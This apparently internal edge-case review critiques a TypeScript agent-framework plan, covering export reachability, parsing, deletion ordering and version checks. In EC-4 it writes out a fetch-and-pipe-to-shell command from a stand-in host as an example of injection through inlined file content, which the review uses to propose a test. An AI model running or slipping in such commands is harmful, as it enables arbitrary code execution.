# Edge Case Review — crossval-4-6-absorption

Date: 2026-08-16
Plan version reviewed: v1.1
Tasks analyzed: 23
Cases found: 25 (EDGE: 12, NEGATIVE: 13 | MUST FIX: 7, SHOULD TEST: 15, DOCUMENT: 3)

> **The headline is not an edge case.** EC-1 is a falsified premise: the gap T1.1 exists to close does not exist, verified by running the import. The measurement that produced it used the same blind technique the plan is written to eliminate — and EC-2 shows the plan reproduces that blindness in its own parser. Both are corrected below.

---

## MUST FIX

### EC-1: `TheokitAgentError` is already reachable — gap 16 and task T1.1 rest on a false premise

- **Affected task:** T1.1 (and, upstream, registered gap 16 + the Error-model score of 2,50)
- **Kind:** NEGATIVE (the measurement was invalid, not the code)
- **Family:** Format / measurement technique
- **Scenario:** The gap was established by grepping `packages/agents/dist/*.d.ts` for `TheokitAgentError` and observing only `import { TheokitAgentError } from '@theokit/sdk/errors'`, never a declaration or a re-export. That grep cannot see `export * from '@theokit/sdk/errors'`, which sits at `packages/agents/dist/index.d.ts:8` and forwards the whole module — including the base class and `isTransientError`.
- **Impact:** T1.1 would add a re-export that already exists (parsimony rung 1 — "does this need to exist? no"), and the plan would claim to close a gap that was never open. Downstream, `Error model` is scored 2,50 partly on this and the U-11 caveat repeats it, so the Goal's arithmetic is built on a wrong input.
- **Evidence (executed, not inferred):**
  - `grep -n "^export \*" packages/agents/dist/index.d.ts` → five forwards at `:8,15,21,22,23` (`@theokit/sdk/errors`, `/retry`, `/concurrency`, `/messages`, `/models`).
  - Runtime: `import('packages/agents/dist/index.js')` → `TheokitAgentError` is `function`, `isTransientError` is `function`.
  - Types: a probe importing both from `@theokit/agents` and using `e instanceof TheokitAgentError` + `isTransientError(e)` type-checks clean under `strict` with the repo's own `tsc` (exit 0).
- **Note on independence:** two separate measurements made this mistake — the cross-validation's gap 16 and the U-verification agent's filed caveat ("re-exports `TheokitAgentError` from none of its 21 subpaths"). Agreement between two runs of the same blind technique is not corroboration.
- **Suggested fix:** Delete T1.1. Replace it with a one-line capability-index row (`Catch any framework error by base class | TheokitAgentError | @theokit/agents | (already shipping)`) and re-score `Error model` on the surviving evidence (bare-throw rate 23/87 vs the consumer's 6/57), which lifts it without any code change.

### EC-2: T0.1's parser has the exact blind spot that produced EC-1 — it will reject valid index rows

- **Affected task:** T0.1
- **Kind:** NEGATIVE (invalid rejection — a false negative from the guard)
- **Family:** Format / parsing
- **Scenario:** The plan's `declaredExports()` parses `declare (const|function|class|…) <Name>` plus `export { … }` lists. It does not follow `export * from '<module>'`. Every symbol arriving through the five star forwards is therefore absent from the set, so a *correct* index row citing one of them fails the guard.
- **Impact:** CI goes red on true rows. Worse, the likely reaction is to delete the row — removing a real capability from the map, which is the opposite of the task's purpose.
- **Suggested fix:** In `declaredExports()`, resolve `export * from '<spec>'` by recursing into that module's `.d.ts` (bounded to one hop for `@theokit/*` specifiers, which is all five forwards need), and add a fixture asserting a star-forwarded symbol resolves.

### EC-3: T2.2 does not specify the order of unlink vs registry removal

- **Affected task:** T2.2
- **Kind:** NEGATIVE (partial failure mid-operation)
- **Family:** State
- **Scenario:** The task's Deep Dives says "a remover that rejects mid-sweep: the transcript file has already been unlinked", which fixes the order as file-first without saying so or justifying it. If the registry removal then fails, the registry holds an entry pointing at a file that no longer exists, and `Agent.list` / `sessionHasWriter` will report a session whose transcript is gone.
- **Impact:** A crash-consistent-looking but broken state that no later GC run repairs, because GC works from transcripts and this entry has none. The reverse order leaves an orphan transcript file, which the *next* GC run collects — strictly recoverable.
- **Suggested fix:** Specify registry-first, unlink-second, and add `registry_removed_before_the_file_is_unlinked()` asserting that a rejecting remover leaves the transcript file **present**.

### EC-4: T3.3 does not bound template expansion depth — an inlined file can inject a shell segment

- **Affected task:** T3.3
- **Kind:** NEGATIVE (invalid/hostile input)
- **Family:** Permission / security
- **Scenario:** The expander inlines `@file` contents and executes `` !`shell` `` segments. The plan does not say whether expansion is single-pass. If inlined content is re-scanned, a file containing `` !`curl evil.sh | sh` `` becomes command execution triggered by a command template that never named it — and `@file` reads are far less scrutinised than shell segments when a user reviews a template.
- **Impact:** Arbitrary command execution from file content, in a path the trust posture believes it already gated.
- **Suggested fix:** State single-pass explicitly and assert it: `inlined_file_content_is_inert()` — a fixture file containing `` !`echo pwned` `` produces that text literally and the injected `shell` is never called for it.

### EC-5: T2.3 does not reject `nth < 1`

- **Affected task:** T2.3
- **Kind:** NEGATIVE (out of range)
- **Family:** Input
- **Scenario:** `nth` is documented 1-based. With `nth = 0`, the pseudo-code's loop increments `seen` before comparing, so `seen === 0` never matches and the scan falls through to `ReachableTurnsExceededError(0, count)` — an error saying turn 0 exceeds the 5 reachable turns, which is nonsense. Negative values behave the same.
- **Impact:** A caller passing a 0-based index (the obvious mistake, since record indices *are* 0-based in the same module) gets a misleading message that sends them looking at the transcript instead of at their own call.
- **Suggested fix:** Guard at entry — `if (nth < 1) throw new InvalidTurnOrdinalError(nth)` — and assert the distinct error type, not the exceeded one.

### EC-6: T5.0 verifies that a version *resolves*, not that it is *the expected one*

- **Affected task:** T5.0
- **Kind:** EDGE (the boundary of a valid publish)
- **Family:** Timing / Input
- **Scenario:** `npm view @theokit/agents version` returns the `latest` dist-tag. It resolves successfully while still pointing at the **previous** version if the publish partially failed, if the registry is lagging, or if the release was published under a different tag. The checkpoint passes and Phase 5 begins against unchanged packages.
- **Impact:** Adoption edits are made and tested against code that does not contain the closures, producing green tests that prove nothing — the precise failure Phase 5's ordering exists to prevent.
- **Suggested fix:** Compare against the expected version explicitly and fail on inequality: `test -n "$(npm view @theokit/agents@$EXPECTED version 2>/dev/null)"` per package, with `$EXPECTED` read from the repo's `package.json`.

### EC-7: The D8 sunset date exceeds the 90-day ceiling by two days

- **Affected task:** D8 (governs T0.1 and T4.1)
- **Kind:** EDGE (boundary of a policy limit)
- **Family:** Timing
- **Scenario:** `code-quality-golden-rule.md § 4` caps allowlist/warn windows at ≤ 90 days. The plan declares 2026-11-15; the plan is dated 2026-08-15, and 2026-08-15 + 90 days is **2026-11-13**. The declared date is 92 days out.
- **Impact:** Small in effect, but it is a written rule violated by the document that cites it — and it is mechanically checkable, so it will be caught later at higher cost.
- **Suggested fix:** Change the sunset to `2026-11-13` in D8, T4.1 and the allowlist file header.

---

## SHOULD TEST

### EC-8: Timeout fires, then the remover succeeds anyway
- **Affected task:** T2.2 · **Kind:** NEGATIVE
- **Suggested test:** `test_remover_that_settles_after_the_timeout_does_not_flip_the_report` — assert the result stays `registryRemoved: false` and that the late resolution does not mutate an already-returned result. The report is wrong in the safe direction (claims not-removed when it was), which is acceptable; the unacceptable outcome is a mutated result object.

### EC-9: Symlink loop inside the search tree
- **Affected task:** T3.2 · **Kind:** NEGATIVE
- **Suggested test:** `test_symlink_cycle_is_bounded_by_the_budget_and_yields_undetermined` — a fixture with `a/b -> a`; assert the walk terminates, the budget is not exceeded, and the affected project is `UNDETERMINED` (never `DEAD`).

### EC-10: `listProjects()` throws
- **Affected task:** T3.2 · **Kind:** NEGATIVE
- **Suggested test:** `test_enumeration_failure_yields_undetermined_for_every_project_with_a_typed_error` — the injected enumerator throws; assert nothing is classified `DEAD` and the error surfaces typed rather than as a bare throw from inside the sweep.

### EC-11: `@file` names a file that does not exist
- **Affected task:** T3.3 · **Kind:** NEGATIVE
- **Suggested test:** `test_missing_file_reference_warns_and_substitutes_empty` — assert `warn` is called naming the path and that the literal `@name` never survives into the expanded output (the same leak rule the plan already applies to `$N`).

### EC-12: File exactly at the 64 KB cap
- **Affected task:** T3.3 · **Kind:** EDGE
- **Suggested test:** `test_file_of_exactly_the_cap_is_inlined_whole_and_one_byte_over_is_truncated` — the boundary in both directions, since "larger is truncated" leaves the equality case unstated.

### EC-13: A shell segment fails (`ok: false`)
- **Affected task:** T3.3 · **Kind:** NEGATIVE
- **Suggested test:** `test_failed_shell_segment_warns_and_substitutes_its_output_not_silence` — assert the failure is visible in the expansion or in a warn; a silently empty substitution turns a broken command into a prompt that reads as if it succeeded.

### EC-14: Several `compact_boundary` markers, or one as the final record
- **Affected task:** T2.3 · **Kind:** EDGE
- **Suggested test:** `test_counting_starts_after_the_last_boundary_when_several_are_present` and `test_boundary_as_the_final_record_yields_zero_reachable_turns` — assert the typed error names zero, rather than an off-by-one landing on the boundary itself.

### EC-15: The credential home is a symlink
- **Affected task:** T2.4 · **Kind:** NEGATIVE
- **Suggested test:** `test_a_symlinked_home_is_checked_on_its_target_not_on_the_link` — a link's own mode is typically `0777` and says nothing about the directory it points at; checking the wrong one either always passes or always fails.

### EC-16: The credential home does not exist yet
- **Affected task:** T2.4 · **Kind:** EDGE
- **Suggested test:** `test_an_absent_home_is_not_an_insecure_home` — first run on a clean machine; assert the check distinguishes "absent" from "insecure" rather than refusing to start.

### EC-17: Degenerate window inputs
- **Affected task:** T3.4 · **Kind:** EDGE
- **Suggested test:** `test_window_of_size_zero_and_selection_out_of_range_clamp_without_negative_indices` — `size = 0`, `selected = -1`, `selected >= total`; assert `hiddenBefore`/`hiddenAfter` are never negative, which is the value a renderer would print.

### EC-18: Allowlist absent, or an entry with a malformed date
- **Affected task:** T4.1 · **Kind:** NEGATIVE
- **Suggested test:** `test_absent_allowlist_is_an_empty_allowlist` and `test_malformed_sunset_is_reported_and_the_entry_is_ignored` — a gate that crashes on its own config file is a gate that gets removed from `check:all`. Mirrors the `allowlist_malformed_entry` handling the code-quality gate already specifies.

### EC-19: `[Unreleased]` section absent from a CHANGELOG
- **Affected task:** T4.3 · **Kind:** NEGATIVE
- **Suggested test:** `test_absent_unreleased_section_is_not_a_violation` — a repo mid-release has an empty or absent `[Unreleased]`; the check must not fire there.

### EC-20: Two pending items with the same id
- **Affected task:** T2.7 · **Kind:** EDGE
- **Suggested test:** `test_a_repeated_id_replaces_rather_than_duplicating_and_keeps_the_latest_payload` — the surface keys its render state by id, so silent duplication would show one question twice.

### EC-21: An index row citing a member (`Foo.bar`) or a generic (`Agent<T>`)
- **Affected task:** T0.1 · **Kind:** EDGE
- **Suggested test:** `test_member_and_generic_citations_resolve_on_their_root_symbol` — the plan states the stripping rule; it needs the assertion, since these are the shapes the corrected rows (`AgentBuilder.create`, `Tool.create`) actually take.

### EC-22: The generator or the shape probe runs against an unbuilt `dist`
- **Affected task:** T1.2 · **Kind:** NEGATIVE
- **Suggested test:** `test_unbuilt_dist_skips_with_a_reason_and_does_not_report_parity` — reuse the existing `noteSkip('G10')` convention rather than letting a missing build read as "three symbols withheld".

---

## DOCUMENT

### EC-23: Four repositories with independent branch state during Phase 5
- **Kind:** NEGATIVE · **Accepted risk:** Risk R2 already names the mixed-floor hazard and T5.0 gates it. What is not covered is the mundane case — one of the four repos has local drift or a conflicted `workspace` — and engineering around it would mean the plan managing four git states, which is worse than the problem. Accepted: the implementer resolves branch state per repo before Phase 5, as ordinary hygiene.

### EC-24: The real-scale liveness verification depends on a machine that changes
- **Kind:** EDGE · **Accepted risk:** The Global DoD requires observing the oracle against the operator's real tree (13.269 project directories, per the original measurement). That number will differ by the time it runs. Accepted: the assertion is *equivalence between the two implementations on whatever tree exists*, plus the budget property — not reproduction of the historical count. Recorded so a differing count is not mistaken for a failed verification.

### EC-25: Narrowing `sinceMarker` from substring to structural may break an unlisted caller
- **Kind:** NEGATIVE · **Accepted risk:** T2.5 already includes a caller audit as its first step. Narrowing is the correct direction (the loose behaviour is the bug), and a caller depending on looseness is depending on the defect. Accepted: if the audit finds one, it is filed as a finding rather than blocking the fix.

---

## Summary

| Task | EDGE | NEGATIVE | MUST FIX | SHOULD TEST | DOCUMENT |
|------|------|----------|----------|-------------|----------|
| T0.1 | 1 | 1 | 1 (EC-2) | 1 (EC-21) | 0 |
| T1.1 | 0 | 1 | 1 (EC-1) | 0 | 0 |
| T1.2 | 0 | 1 | 0 | 1 (EC-22) | 0 |
| T1.3 | — | — | 0 | 0 | 0 |
| T2.1 | — | — | 0 | 0 | 0 |
| T2.2 | 0 | 2 | 1 (EC-3) | 1 (EC-8) | 0 |
| T2.3 | 1 | 1 | 1 (EC-5) | 1 (EC-14) | 0 |
| T2.4 | 1 | 1 | 0 | 2 (EC-15, EC-16) | 0 |
| T2.5 | 0 | 1 | 0 | 0 | 1 (EC-25) |
| T2.6 | — | — | 0 | 0 | 0 |
| T2.7 | 1 | 0 | 0 | 1 (EC-20) | 0 |
| T3.1 | — | — | 0 | 0 | 0 |
| T3.2 | 1 | 2 | 0 | 2 (EC-9, EC-10) | 1 (EC-24) |
| T3.3 | 1 | 3 | 1 (EC-4) | 3 (EC-11, EC-12, EC-13) | 0 |
| T3.4 | 1 | 0 | 0 | 1 (EC-17) | 0 |
| T4.1 | 0 | 1 | 0 | 1 (EC-18) | 0 |
| T4.2 | — | — | 0 | 0 | 0 |
| T4.3 | 0 | 1 | 0 | 1 (EC-19) | 0 |
| T5.0 | 1 | 0 | 1 (EC-6) | 0 | 0 |
| T5.1–T5.4 | 0 | 1 | 0 | 0 | 1 (EC-23) |
| D8 (cross-task) | 1 | 0 | 1 (EC-7) | 0 | 0 |

**Coverage check.** Every task touching an input boundary has at least one EDGE and one NEGATIVE case considered. Six tasks are marked `—` with a reason: **T1.3** (exports-map entry + a measurement; its only input is the repo tree, already covered by the transitive-closure step), **T2.1** (a pure predicate over a closed three-value union and an optional struct — the plan's own TDD enumerates every combination, which is the whole input space), **T2.6** (the plan already enumerates all five `undefined` paths, i.e. the complete negative space), **T3.1** (map lookup with a stated fallback; the fallback IS the negative case and it is already in the TDD), **T4.2** (per-subpath decisions verified by import — the negative case is "does not resolve", which is the assertion itself), and **T5.1/T5.3/T5.4** (deletions verified by the consumer's own suite; their boundaries were reviewed in the framework tasks that produce what they consume).

**Verdict: PLAN NEEDS ADJUSTMENT**

Seven MUST FIX items. Six are ordinary hardening. **EC-1 is not** — it removes a task and corrects an input to the Goal's arithmetic, and it does so by falsifying a claim two independent measurements agreed on. Absorbing it means the plan closes one fewer gap than it advertises, and says so.

## Note for the plan revision (v1.2)

EC-1 has consequences beyond deleting T1.1:

1. **Gap 16 should be re-classified** in `cross-validation-output/cross-validation.db` from a `high` open gap to a **measurement error**, with the corrected finding recorded — otherwise the next run re-derives it.
2. **`Error model` (dim 32, currently 2,50)** was scored partly on this. Re-scored on the surviving evidence — 29/29 typed classes, base class reachable, bare-throw rate 23/87 against the consumer's 6/57 — it lands around **4,0**, which *raises* the weighted average rather than lowering it.
3. **The Coverage Matrix denominator drops from 29 to 28**, and the count of gaps closed drops by one. Both should move together, with the reason written.
4. **Risk R3's arithmetic changes.** Dimension 32 rising to ~4,0 without work adds ~1,5 points to the projected total; the target keeps its narrow margin but from a slightly better base. The honest framing is that one of the 17 gaps was never a gap — not that the plan got cheaper.
5. **The technique lesson belongs in T0.1's rationale**, since T0.1 is the task that installs the fix: a symbol-reachability claim is only valid if the method follows `export *`. Three measurements in this cycle failed that test (gap 16, the U-11 caveat, and the plan's own parser design). That is the strongest available argument for EC-2's fix.
